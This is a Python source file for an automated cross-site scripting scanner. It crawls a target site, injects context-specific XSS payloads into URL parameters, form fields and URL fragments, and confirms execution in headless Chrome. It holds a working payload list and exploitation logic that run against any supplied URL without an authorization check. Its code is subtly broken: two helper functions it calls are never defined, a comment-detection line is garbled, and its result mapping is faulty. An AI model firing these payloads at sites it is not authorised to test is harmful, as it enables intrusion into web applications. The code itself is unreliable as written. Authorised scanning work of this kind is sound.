# scanner.py (v6)
import requests
from bs4 import BeautifulSoup # Keep for parsing forms/links, less reliable for precise context
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
import argparse
import sys
import time
from collections import deque
import concurrent.futures
import os
import re # For context analysis heuristics
import uuid # For unique probes

# Selenium imports
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import (
    TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException,
    NoSuchElementException, WebDriverException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager

# --- Configuration ---
DOM_PAYLOAD_ATTRIBUTE = 'data-xss-success'
DOM_PAYLOAD_VALUE = 'true'
CONFIRMATION_WAIT_TIMEOUT = 3
MAX_WORKERS = 10
UNIQUE_PROBE_PREFIX = "xSsPrObE"

# --- Context-Specific Payloads ---
# Payloads designed to trigger alert() or the DOM change attribute
ALERT_PAYLOADS = [
    "<script>alert('XSS_Alert1')</script>",
    "<img src=x onerror=alert('XSS_Alert4')>",
    "<svg onload=alert('XSS_A7')>",
    "<details open ontoggle=alert('XSS_A12b')><summary>X</summary></details>",
]
DOM_CHANGE_PAYLOADS = [
    f"<img src=x onerror=\"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}', '{DOM_PAYLOAD_VALUE}')\">",
    f"<svg onload=\"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}', '{DOM_PAYLOAD_VALUE}')\">",
    f"<details open ontoggle=\"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}', '{DOM_PAYLOAD_VALUE}')\"><summary>X</summary></details>",
]
# Combine base execution payloads
EXECUTION_PAYLOADS = ALERT_PAYLOADS + DOM_CHANGE_PAYLOADS

CONTEXT_PAYLOADS = {
    "HTML_TEXT": EXECUTION_PAYLOADS,
    "HTML_ATTR_DQ": [f'">{p}' for p in EXECUTION_PAYLOADS] + ['" autofocus onfocus=alert("XSS_ATTR_DQ")>', f'" onmouseover="document.body.setAttribute(\'{DOM_PAYLOAD_ATTRIBUTE}\',\'{DOM_PAYLOAD_VALUE}\')"'],
    "HTML_ATTR_SQ": [f"'>{p}" for p in EXECUTION_PAYLOADS] + ["' autofocus onfocus=alert('XSS_ATTR_SQ')>", f"' onmouseover='document.body.setAttribute(\"{DOM_PAYLOAD_ATTRIBUTE}\",\"{DOM_PAYLOAD_VALUE}\")'"],
    "HTML_ATTR_UQ": [f" autofocus onfocus=alert('XSS_ATTR_UQ')", f" onmouseover=alert('XSS_ATTR_UQ2')", f" onload=alert('XSS_ATTR_UQ3')"] + \
                    [f" autofocus onfocus=\"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}','{DOM_PAYLOAD_VALUE}')\""], # Needs space before event
    "SCRIPT_STRING_DQ": [f'";alert("XSS_JS_DQ");//', f'";document.body.setAttribute("{DOM_PAYLOAD_ATTRIBUTE}","{DOM_PAYLOAD_VALUE}");//'],
    "SCRIPT_STRING_SQ": [f"';alert('XSS_JS_SQ');//", f"';document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}','{DOM_PAYLOAD_VALUE}');//"],
    "SCRIPT_BLOCK": [f"alert('XSS_JS_BLOCK');", f"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}','{DOM_PAYLOAD_VALUE}');"],
    # Add contexts for comments, style tags etc. later
    "UNKNOWN": EXECUTION_PAYLOADS # Fallback if context unclear
}

# Default payload list if file loading fails or not provided
DEFAULT_PAYLOADS = EXECUTION_PAYLOADS # Default focuses on execution

# --- Helper Functions ---

def load_payloads(filepath):
    """Loads payloads from a file, one per line."""
    try:
        if not os.path.exists(filepath):
             print(f"[!] Payload file not found: {filepath}", file=sys.stderr)
             return None
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        if not payloads:
             print(f"[!] No valid payloads found in file: {filepath}", file=sys.stderr)
             return None
        print(f"[*] Loaded {len(payloads)} payloads from {filepath}")
        return payloads
    except IOError as e:
        print(f"[!] Error reading payload file {filepath}: {e}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"[!] Unexpected error loading payload file {filepath}: {e}", file=sys.stderr)
        return None

def setup_driver():
    """Sets up the Selenium WebDriver."""
    # (Same as v5 - no changes needed here)
    chrome_options = ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    try:
        os.environ['WDM_LOG_LEVEL'] = '0'
        service = ChromeService(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(15)
        return driver
    except ValueError as ve:
         print(f"[!] WebDriver Manager Error: {ve}. Check network or cache.", file=sys.stderr)
         return None
    except WebDriverException as wde:
        print(f"[!] WebDriver Error during setup: {wde}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"[!] Failed to set up Selenium WebDriver: {e}", file=sys.stderr)
        return None

def confirm_xss_with_headless(url, driver, payload_description=""):
    """Uses Selenium to visit a URL and check for an alert OR specific DOM change."""
    # (Same as v5 - no changes needed here)
    if not driver: return None, None
    print(f"  [*] Attempting headless confirmation: {payload_description} -> {url[:100]}...")
    confirmation_type = None; confirmation_detail = ""
    try:
        driver.get(url); time.sleep(0.1)
        try: # Alert Check
            WebDriverWait(driver, CONFIRMATION_WAIT_TIMEOUT).until(EC.alert_is_present())
            alert = driver.switch_to.alert; alert_text = alert.text
            confirmation_detail = f"Alert('{alert_text}')"; print(f"  [+] CONFIRMED via Alert: {confirmation_detail}")
            alert.accept(); confirmation_type = "Alert"; return confirmation_type, confirmation_detail
        except TimeoutException: pass
        except UnexpectedAlertPresentException:
            try:
                alert = driver.switch_to.alert; alert_text = alert.text
                confirmation_detail = f"Unexpected Alert('{alert_text}')"; print(f"  [+] CONFIRMED via Unexpected Alert: {confirmation_detail}")
                alert.accept(); confirmation_type = "Alert (Unexpected)"; return confirmation_type, confirmation_detail
            except NoAlertPresentException: print("  [!] Alert disappeared before handling.", file=sys.stderr)
        if not confirmation_type: # DOM Check
            try:
                WebDriverWait(driver, 0.5).until(lambda d: d.find_element(By.TAG_NAME, 'body').get_attribute(DOM_PAYLOAD_ATTRIBUTE) == DOM_PAYLOAD_VALUE)
                confirmation_detail = f"DOM attribute '{DOM_PAYLOAD_ATTRIBUTE}'='{DOM_PAYLOAD_VALUE}'"; print(f"  [+] CONFIRMED via DOM Change: {confirmation_detail}")
                confirmation_type = "DOM Change"; return confirmation_type, confirmation_detail
            except TimeoutException: pass
            except NoSuchElementException: print("  [!] Body element not found during DOM check.", file=sys.stderr)
            except Exception as e_dom: print(f"  [!] Error during DOM check: {e_dom}", file=sys.stderr)
        return None, None # Not confirmed
    except TimeoutException: print(f"  [!] Page load timed out during confirmation: {url[:100]}", file=sys.stderr); return None, None
    except WebDriverException as wde:
         if "net::ERR_INVALID_URL" in str(wde): print(f"  [!] Invalid URL generated for confirmation: {url[:100]}", file=sys.stderr)
         else: print(f"  [!] WebDriver error during confirmation for {url[:100]}: {wde}", file=sys.stderr)
         return None, None
    except Exception as e: print(f"  [!] Unexpected error during headless confirmation for {url[:100]}: {e}", file=sys.stderr); return None, None

def get_links(url, session, base_domain):
    """Fetches and parses HTML to find all valid links on the same domain."""
    # (Same as v5 - no changes needed here)
    links = set()
    try:
        response = session.get(url, timeout=10); response.raise_for_status()
        content_type = response.headers.get('content-type', '').lower()
        if 'html' not in content_type: return set()
        soup = BeautifulSoup(response.content, 'html.parser')
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            try:
                if href.strip().lower().startswith('javascript:'): continue
                full_url = urljoin(url, href); parsed_link = urlparse(full_url)
                if parsed_link.scheme in ['http', 'https'] and parsed_link.netloc == base_domain:
                    links.add(parsed_link._replace(fragment='').geturl())
            except ValueError: pass # Ignore mailto:, tel:, etc.
        return links
    except requests.exceptions.Timeout: print(f"[!] Timeout fetching links from {url}", file=sys.stderr); return set()
    except requests.exceptions.RequestException as e: print(f"[!] Error fetching links from {url}: {e}", file=sys.stderr); return set()
    except Exception as e: print(f"[!] Error parsing links from {url}: {e}", file=sys.stderr); return set()

def get_forms(url, session):
    """Fetches and parses HTML to find all forms."""
    # (Same as v5 - no changes needed here)
    try:
        response = session.get(url, timeout=10); response.raise_for_status()
        content_type = response.headers.get('content-type', '').lower()
        if 'html' not in content_type: return []
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.Timeout: print(f"[!] Timeout fetching forms from {url}", file=sys.stderr); return []
    except requests.exceptions.RequestException as e: print(f"[!] Error fetching forms from {url}: {e}", file=sys.stderr); return []
    except Exception as e: print(f"[!] Error parsing forms from {url}: {e}", file=sys.stderr); return []

def get_form_details(form):
    """Extracts details from a form element."""
    # (Same as v5 - no changes needed here)
    details = {}; action = form.attrs.get('action', ''); method = form.attrs.get('method', 'get').lower(); inputs = []
    try:
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.attrs.get('name');
            if input_name is None: continue
            input_type = input_tag.attrs.get('type', 'text').lower(); input_value = input_tag.attrs.get('value', '')
            if input_tag.name == 'select' and not input_value:
                 option = input_tag.find('option', selected=True);
                 if not option: option = input_tag.find('option')
                 if option: input_value = option.attrs.get('value', option.text)
            inputs.append({'type': input_type, 'name': input_name, 'value': input_value})
    except Exception as e: print(f"[!] Error parsing inputs for a form: {e}", file=sys.stderr)
    details['action'] = action; details['method'] = method; details['inputs'] = inputs; return details

# --- Context Analysis ---
def analyze_reflection_context(html_content, probe):
    """Analyzes HTML to guess the context of the reflected probe string."""
    # This is a simplified heuristic approach. Robust context analysis is hard.
    # Look for the probe and analyze characters immediately before and after.
    contexts = set()
    # Use finditer to find all occurrences
    for match in re.finditer(re.escape(probe), html_content):
        start, end = match.span()
        # Look at a small window around the probe
        window_start = max(0, start - 70)
        window_end = min(len(html_content), end + 70)
        window = html_content[window_start:window_end]
        probe_in_window_start = start - window_start

        # Check if inside <script>...</script>
        script_match = re.search(r'<script.*?>.*?</script>', window, re.IGNORECASE | re.DOTALL)
        if script_match and script_match.start() < probe_in_window_start < script_match.end():
            # Further check if inside a string literal within the script
            # Simple check: look for closest quotes before the probe within the script tag
            script_content_before_probe = window[script_match.start():probe_in_window_start]
            last_dq = script_content_before_probe.rfind('"')
            last_sq = script_content_before_probe.rfind("'")
            last_nl = script_content_before_probe.rfind('\n') # Newlines can break strings

            if last_dq > last_sq and last_dq > last_nl: # Likely inside double quotes
                 # Check for escaping backslash immediately before probe start in original content
                 if start > 0 and html_content[start-1] != '\\':
                      contexts.add("SCRIPT_STRING_DQ")
                 else: contexts.add("SCRIPT_BLOCK") # Escaped, treat as code block
            elif last_sq > last_dq and last_sq > last_nl: # Likely inside single quotes
                 if start > 0 and html_content[start-1] != '\\':
                      contexts.add("SCRIPT_STRING_SQ")
                 else: contexts.add("SCRIPT_BLOCK") # Escaped, treat as code block
            else: # Likely directly in script block
                 contexts.add("SCRIPT_BLOCK")
            continue # Prioritize script context

        # Check if inside an HTML attribute value
        # Look for patterns like attr="...probe..." or attr='...probe...' or attr=probe...
        # Regex looking backwards from probe start
        attr_match_dq = re.search(r'([\w-]+)\s*=\s*"\s*[^"]*$', html_content[window_start:start])
        attr_match_sq = re.search(r'([\w-]+)\s*=\s*\'\s*[^\']*$', html_content[window_start:start])
        attr_match_uq = re.search(r'([\w-]+)\s*=\s*([^\s>\'"]*)$', html_content[window_start:start]) # Unquoted

        # Check if probe is followed by corresponding quote or space/tag end
        if attr_match_dq and end < len(html_content) and html_content[end:].lstrip().startswith('"'):
            contexts.add("HTML_ATTR_DQ")
            continue
        if attr_match_sq and end < len(html_content) and html_content[end:].lstrip().startswith("'"):
            contexts.add("HTML_ATTR_SQ")
            continue
        if attr_match_uq and end < len(html_content) and re.match(r'[\s/>]', html_content[end:].lstrip()):
             # Check it's not immediately followed by quote which means it wasn't unquoted
             if not html_content[end:].lstrip().startswith("'") and not html_content[end:].lstrip().startswith('"'):
                contexts.add("HTML_ATTR_UQ")
                continue

        # Check if inside HTML comment comment_match = re.search(r'', window, re.DOTALL)
        if comment_match and comment_match.start() < probe_in_window_start < comment_match.end():
             contexts.add("HTML_COMMENT") # Define payloads for this later if needed
             continue

        # Check if inside <style>...</style>
        style_match = re.search(r'<style.*?>.*?</style>', window, re.IGNORECASE | re.DOTALL)
        if style_match and style_match.start() < probe_in_window_start < style_match.end():
            contexts.add("CSS_BLOCK") # Define payloads for this later if needed
            continue

        # Default: Assume HTML text context if none of the above match clearly
        # Check if immediately inside a tag definition <tag ... probe ... > - less likely
        tag_match = re.search(r'<[\w-]+[^>]*$', html_content[window_start:start])
        if tag_match and end < len(html_content) and html_content[end:].lstrip().startswith('>'):
             contexts.add("HTML_TAG_DEFINITION") # Special context
             continue

        # If no specific context found, assume general HTML text
        if not contexts: # Check if contexts is still empty for this occurrence
            contexts.add("HTML_TEXT")


    if not contexts:
        return ["UNKNOWN"] # No reflection found or error

    # Prioritize more specific contexts if multiple detected (e.g., script over html)
    if "SCRIPT_STRING_DQ" in contexts: return ["SCRIPT_STRING_DQ"]
    if "SCRIPT_STRING_SQ" in contexts: return ["SCRIPT_STRING_SQ"]
    if "SCRIPT_BLOCK" in contexts: return ["SCRIPT_BLOCK"]
    if "HTML_ATTR_DQ" in contexts: return ["HTML_ATTR_DQ"]
    if "HTML_ATTR_SQ" in contexts: return ["HTML_ATTR_SQ"]
    if "HTML_ATTR_UQ" in contexts: return ["HTML_ATTR_UQ"]
    # Add other specific contexts here (comment, style, tag)
    if "HTML_TEXT" in contexts: return ["HTML_TEXT"]

    return list(contexts) # Return list of detected contexts (might be multiple if logic overlaps)


# --- Functions for Context-Aware Reflected Scanning ---

def task_inject_and_confirm(url, injection_point_type, param_or_form_details, payload, session, driver):
    """Task: Injects a specific payload and performs headless confirmation."""
    test_url = None
    response_body = None
    final_url = None
    result_base = {'payload': payload, 'confirmed': False}

    try:
        # --- 1. Perform Injection ---
        if injection_point_type == 'URL_PARAM':
            param_name = param_or_form_details['name']
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            if param_name not in query_params: return None
            modified_params = query_params.copy(); modified_params[param_name] = [payload]
            modified_query = urlencode(modified_params, doseq=True)
            test_url = parsed_url._replace(query=modified_query).geturl()
            response = session.get(test_url, timeout=10, allow_redirects=True)
            final_url = response.url
            result_base.update({'type': 'URL Parameter', 'url': url, 'parameter': param_name, 'final_url': final_url})

        elif injection_point_type == 'FORM':
            form_details = param_or_form_details
            target_url = urljoin(url, form_details['action'])
            inputs = form_details['inputs']; data = {}; tested_fields = []
            for input_item in inputs:
                if not input_item.get('name'): continue
                if input_item['type'] in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea', 'hidden']:
                    data[input_item['name']] = payload; tested_fields.append(input_item['name'])
                else: data[input_item['name']] = input_item['value']
            if not tested_fields: return None

            if form_details['method'] == 'post':
                response = session.post(target_url, data=data, timeout=10, allow_redirects=True)
            else:
                response = session.get(target_url, params=data, timeout=10, allow_redirects=True)
            final_url = response.url
            result_base.update({'type': 'Form Input', 'url': url, 'action': form_details['action'], 'method': form_details['method'], 'fields': tested_fields, 'final_url': final_url})
        else:
            return None # Unknown type

        # --- 2. Perform Confirmation ---
        if driver and final_url:
            confirmation_type, confirmation_detail = confirm_xss_with_headless(final_url, driver, payload_description=f"{result_base['type']} Payload: {payload[:50]}...")
            if confirmation_type:
                result_base['confirmed'] = True
                result_base['confirmation_type'] = confirmation_type
                result_base['confirmation_detail'] = confirmation_detail
                return result_base # Return confirmed vulnerability
        else:
            # If no driver, cannot confirm - maybe report reflection? For now, only report confirmed.
            pass

        return None # Not confirmed or error during injection/confirmation

    except requests.exceptions.Timeout: return None
    except requests.exceptions.RequestException: return None
    except Exception as e:
        print(f"  [!] Error in task_inject_and_confirm for {payload[:50]}: {e}", file=sys.stderr)
        return None


def scan_page_reflected_context_aware(url, session, driver, executor, full_payload_list):
    """Scans a single page for REFLECTED XSS using context analysis."""
    print(f"[*] Scanning (Context-Aware Reflected) {url}...")
    confirmed_vulnerabilities = []
    probe = f"{UNIQUE_PROBE_PREFIX}{uuid.uuid4().hex[:8]}" # Unique probe for this page scan

    injection_points = [] # List of {'type': 'URL_PARAM'/'FORM', 'details': ...}

    # --- 1. Identify Injection Points and Probe ---
    # URL Params
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    param_probe_results = {} # Store {param_name: (response_body, final_url)}
    if query_params:
        print(f"  [*] Probing {len(query_params)} URL parameters...")
        probe_futures = []
        for param_name in query_params.keys():
            if not query_params[param_name]: continue
            # Submit task to inject probe into this param
            probe_futures.append(executor.submit(task_test_url_param, url, param_name, probe, session))
            injection_points.append({'type': 'URL_PARAM', 'details': {'name': param_name}})

        for i, future in enumerate(concurrent.futures.as_completed(probe_futures)):
            param_name = list(query_params.keys())[i] # Assuming order is maintained - might be fragile
            probe_result = future.result()
            if probe_result and probe in probe_result.get('response_body', ''): # Check if probe reflected
                 param_probe_results[param_name] = (probe_result['response_body'], probe_result['final_url'])
                 print(f"    [+] Probe reflected in parameter: {param_name}")


    # Forms
    forms = get_forms(url, session)
    form_probe_results = {} # Store {form_index: (response_body, final_url)}
    if forms:
        print(f"  [*] Probing {len(forms)} forms...")
        probe_futures = []
        form_details_list = []
        for i, form in enumerate(forms):
            details = get_form_details(form)
            if not details['inputs']: continue
            form_details_list.append(details)
            # Submit task to inject probe into this form
            probe_futures.append(executor.submit(task_test_form, details, url, probe, session))
            injection_points.append({'type': 'FORM', 'details': details})

        for i, future in enumerate(concurrent.futures.as_completed(probe_futures)):
            form_details = form_details_list[i] # Assuming order
            probe_result = future.result()
            if probe_result and probe in probe_result.get('response_body', ''):
                 form_probe_results[i] = (probe_result['response_body'], probe_result['final_url'])
                 print(f"    [+] Probe reflected in form: Action='{form_details['action']}', Method='{form_details['method']}'")


    # --- 2. Analyze Context and Launch Exploit Payloads ---
    exploit_futures = []
    if not driver: # Cannot run exploit phase without driver for confirmation
         print("  [*] Skipping exploit phase as headless browser is disabled.")
         return []

    # URL Params Context Analysis & Exploitation
    print(f"  [*] Analyzing context and launching exploits for reflected URL parameters...")
    for param_name, (response_body, final_url) in param_probe_results.items():
        contexts = analyze_reflection_context(response_body, probe)
        print(f"    - Param '{param_name}': Detected context(s): {contexts}")
        payloads_to_try = set()
        for ctx in contexts:
            payloads_to_try.update(CONTEXT_PAYLOADS.get(ctx, CONTEXT_PAYLOADS["UNKNOWN"]))
        # If context is UNKNOWN or analysis failed, maybe use full list?
        # if not payloads_to_try or "UNKNOWN" in contexts:
        #     payloads_to_try.update(full_payload_list)

        print(f"      -> Trying {len(payloads_to_try)} context-specific payloads for '{param_name}'...")
        param_details = {'name': param_name}
        for payload in payloads_to_try:
            exploit_futures.append(executor.submit(task_inject_and_confirm, url, 'URL_PARAM', param_details, payload, session, driver))

    # Forms Context Analysis & Exploitation
    print(f"  [*] Analyzing context and launching exploits for reflected forms...")
    for i, (response_body, final_url) in form_probe_results.items():
        form_details = form_details_list[i]
        contexts = analyze_reflection_context(response_body, probe)
        print(f"    - Form (Action='{form_details['action']}'): Detected context(s): {contexts}")
        payloads_to_try = set()
        for ctx in contexts:
            payloads_to_try.update(CONTEXT_PAYLOADS.get(ctx, CONTEXT_PAYLOADS["UNKNOWN"]))
        # if not payloads_to_try or "UNKNOWN" in contexts:
        #     payloads_to_try.update(full_payload_list)

        print(f"      -> Trying {len(payloads_to_try)} context-specific payloads for form...")
        for payload in payloads_to_try:
             exploit_futures.append(executor.submit(task_inject_and_confirm, url, 'FORM', form_details, payload, session, driver))

    # --- 3. Collect Confirmed Vulnerabilities ---
    if exploit_futures:
        print(f"[*] Waiting for {len(exploit_futures)} context-aware exploit checks...")
        processed_count = 0
        for future in concurrent.futures.as_completed(exploit_futures):
            processed_count += 1
            result = future.result()
            if result and result.get('confirmed'):
                confirmed_vulnerabilities.append(result)
                print(f"  [+] CONFIRMED Vulnerability found via context-aware check!")
            # Progress indicator
            if processed_count % 20 == 0:
                 print(f"    Processed {processed_count}/{len(exploit_futures)} exploit checks...")
        print(f"[*] Context-aware exploit checks complete for {url}.")

    return confirmed_vulnerabilities


# (scan_for_dom_xss remains the same as v5)
def scan_for_dom_xss(url, driver, payload_list):
    """Scans for DOM XSS by injecting payloads into the URL fragment."""
    if not driver: return []
    print(f"[*] Scanning (DOM XSS via Hash) {url}...")
    confirmed_dom_vulns = []; base_url = url.split('#')[0]
    for payload in payload_list:
        try:
             encoded_payload = quote(payload, safe=':/~?=&%')
             test_url = f"{base_url}#{encoded_payload}"
        except Exception as e_quote: print(f"  [!] Error encoding payload for URL hash: {payload[:50]}... ({e_quote})", file=sys.stderr); continue
        confirmation_type, confirmation_detail = confirm_xss_with_headless(test_url, driver, payload_description=f"Hash Payload: {payload[:50]}...")
        if confirmation_type:
            confirmed_dom_vulns.append({'type': 'DOM-based XSS', 'url': url, 'source': 'URL Fragment (#)', 'payload': payload, 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': test_url})
            # break # Optional optimization
    print(f"[*] DOM XSS Scan complete for {url}. Found {len(confirmed_dom_vulns)} confirmed.")
    return confirmed_dom_vulns


# --- Crawler ---
def crawl(start_url, max_depth, session, driver, executor, payload_list):
    """Performs a breadth-first crawl and scan (Context-Aware Reflected + DOM)."""
    if max_depth <= 0: max_depth = 1
    base_domain = urlparse(start_url).netloc
    if not base_domain: print(f"[!] Could not determine base domain for URL: {start_url}", file=sys.stderr); return []

    queue = deque([(start_url, 0)]); visited = {start_url}; all_vulnerabilities = []

    while queue:
        current_url, current_depth = queue.popleft()
        print(f"\n--- Scanning URL: {current_url} (Depth: {current_depth}) ---")
        if current_depth >= max_depth: continue

        # --- Scan for Context-Aware Reflected XSS ---
        # This function now handles probing, context analysis, payload selection, injection, and confirmation internally
        confirmed_reflected = scan_page_reflected_context_aware(current_url, session, driver, executor, payload_list)
        all_vulnerabilities.extend(confirmed_reflected)

        # --- Scan for DOM XSS ---
        if driver:
             confirmed_dom = scan_for_dom_xss(current_url, driver, payload_list)
             all_vulnerabilities.extend(confirmed_dom)
        else: print("[*] Skipping DOM XSS checks as headless browser is disabled.")

        # --- Find Links ---
        if current_depth < max_depth - 1:
            print(f"[*] Discovering links on {current_url}...")
            new_links = get_links(current_url, session, base_domain); added_count = 0
            for link in new_links:
                if link not in visited: visited.add(link); queue.append((link, current_depth + 1)); added_count += 1
            if added_count > 0: print(f"  - Added {added_count} new links to queue (Depth {current_depth + 1})")

    print(f"\n[*] Crawler finished. Visited {len(visited)} unique URLs.")
    return all_vulnerabilities


# --- Entry Point ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Scanner v6 (Context-Aware) - Use Responsibly!")
    # Arguments
    parser.add_argument("url", help="The starting URL to scan")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Maximum crawl depth (default: 2)")
    parser.add_argument("--no-headless", action="store_true", help="Disable headless browser confirmation AND context-aware/DOM checks")
    parser.add_argument("-w", "--workers", type=int, default=MAX_WORKERS, help=f"Number of concurrent workers (default: {MAX_WORKERS})")
    parser.add_argument("-pL", "--payload-list", help="Path to a file containing payloads (used for DOM scan and fallback)")

    args = parser.parse_args()
    target_url = args.url; max_depth = args.depth; use_headless = not args.no_headless; num_workers = args.workers; payload_file = args.payload_list

    # Load payloads (primarily for DOM scan and potential fallback)
    payloads_to_use = DEFAULT_PAYLOADS
    if payload_file:
        loaded_payloads = load_payloads(payload_file)
        if loaded_payloads: payloads_to_use = loaded_payloads
        else: print("[!] Failed to load payloads from file, using default list.", file=sys.stderr)
    else: print("[*] No payload list provided, using default list for DOM/fallback.")


    # Setup Selenium Driver
    driver = None
    if use_headless:
        print("[*] Setting up headless browser (Selenium)...")
        driver = setup_driver()
        if not driver: print("[!] Proceeding without headless features."); use_headless = False
    else: print("[*] Headless features disabled via command line.")

    # Use a session object
    session = requests.Session(); session.headers.update({'User-Agent': 'XSSScanner/0.6 (+https://github.com/your-repo)'})

    start_time = time.time()

    # Create ThreadPoolExecutor
    all_confirmed_vulns = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        # Pass the final list of payloads (used for DOM and fallback)
        all_confirmed_vulns = crawl(target_url, max_depth, session, driver, executor, payloads_to_use)

    end_time = time.time()

    # --- Reporting ---
    print("\n--- Scan Summary ---")
    if all_confirmed_vulns:
        print(f"\n[***] Found {len(all_confirmed_vulns)} CONFIRMED XSS vulnerabilities:")
        all_confirmed_vulns.sort(key=lambda x: (x['url'], x['type']))
        for vuln in all_confirmed_vulns:
             base_info = f"Type: {vuln['type']}, Confirm: {vuln.get('confirmation_type', 'N/A')} ({vuln.get('confirmation_detail', 'N/A')}), Payload: {vuln['payload']}"
             if vuln['type'] == 'URL Parameter':
                 print(f"  - URL: {vuln['url']}, Param: {vuln['parameter']}, {base_info}, Final URL: {vuln['final_url']}")
             elif vuln['type'] == 'Form Input':
                  print(f"  - URL: {vuln['url']}, Form Action: {vuln['action']}, Method: {vuln['method']}, Fields: {vuln['fields']}, {base_info}, Final URL: {vuln['final_url']}")
             elif vuln['type'] == 'DOM-based XSS':
                  print(f"  - URL: {vuln['url']}, Source: {vuln['source']}, {base_info}, Trigger URL: {vuln['final_url']}")
             else: print(f"  - {vuln}")
    else:
        print("\n[*] No vulnerabilities confirmed via headless browser.")
        if not use_headless: print("    (Headless confirmation, context-aware checks, and DOM XSS checks were disabled.)")

    print(f"\n--- Scan Finished in {end_time - start_time:.2f} seconds ---")

    # Cleanup
    if driver: print("[*] Closing headless browser..."); driver.quit()

